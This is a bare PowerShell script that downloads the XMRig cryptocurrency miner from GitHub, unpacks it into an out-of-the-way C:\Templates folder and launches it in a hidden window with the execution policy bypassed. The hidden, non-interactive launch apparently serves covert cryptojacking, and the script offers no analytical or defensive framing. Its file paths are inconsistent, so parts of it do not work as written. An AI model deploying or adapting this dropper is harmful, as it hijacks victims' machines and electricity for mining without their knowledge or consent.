New-Item -Path 'C:\Templates\ml\xm' -ItemType Directory
cd C:\Templates\ml\xm 
wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip -O xmrig-6.21.0-gcc-win64.zip
Expand-Archive -Path  xmrig-6.21.0-gcc-win64.zip -DestinationPath ./
cp config.json  C:\Templates\xmrig-6.21.0
cd xmrig-6.21.0
$powershellPath = "$env:windir\system32\windowspowershell\v1.0\powershell.exe"
$xmprocess="C:\Templates\ml\xm\6.21.0\xmrig.exe -c C:\Templates\ml\xm\xmrig-6.21.0\config.json"
$processxm=Start-Process -WindowStyle hidden $powershellPath -ArgumentList ("-ExecutionPolicy Bypass -noninteractive -noprofile " + $xmprocess) -PassThru
